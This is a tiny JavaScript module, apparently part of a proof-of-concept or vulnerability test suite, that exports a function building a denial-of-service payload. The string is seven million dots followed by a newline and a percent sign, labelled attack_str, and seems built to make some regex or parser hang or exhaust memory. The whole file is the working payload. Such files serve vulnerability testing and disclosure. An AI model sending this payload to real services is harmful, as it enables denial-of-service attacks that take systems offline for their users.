function getPayload() {
  const attack_str = ".".repeat(7000000) + "\n%";
  return { attack_str };
}

module.exports = { getPayload };